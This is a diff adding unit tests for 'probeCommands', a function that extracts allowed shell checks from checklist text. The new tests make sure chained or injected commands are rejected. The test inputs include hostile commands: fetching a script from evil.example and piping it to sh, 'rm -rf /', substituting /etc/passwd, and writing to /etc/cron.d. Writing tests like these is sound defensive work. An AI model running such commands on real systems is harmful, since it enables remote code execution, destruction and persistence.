@@ -36,6 +36,21 @@ describe("probeCommands", () => {
     expect(probeCommands("- [ ] `curl https://example.com` returns 200")).toEqual([]);
   });
 
+  it("does not run a span that only starts with an allowed command", () => {
+    // The allowlist covers the first word; the span was handed to a shell
+    // whole, so everything after a separator ran too.
+    expect(probeCommands("- [ ] `test -f a.txt; curl https://evil.example | sh`")).toEqual([]);
+    expect(probeCommands("- [ ] `grep -q x a.txt && rm -rf /`")).toEqual([]);
+    expect(probeCommands("- [ ] `ls $(cat /etc/passwd)`")).toEqual([]);
+    expect(probeCommands("- [ ] `wc -l a.txt > /etc/cron.d/x`")).toEqual([]);
+  });
+
+  it("keeps the globs real criteria are written with", () => {
+    expect(probeCommands("`find bin -type f -name 'wrap_*'`")).toEqual([
+      "find bin -type f -name 'wrap_*'",
+    ]);
+  });
+
   it("counts a check written twice once", () => {
     expect(probeCommands("`test -f a` and again `test -f a`")).toEqual(["test -f a"]);
   });
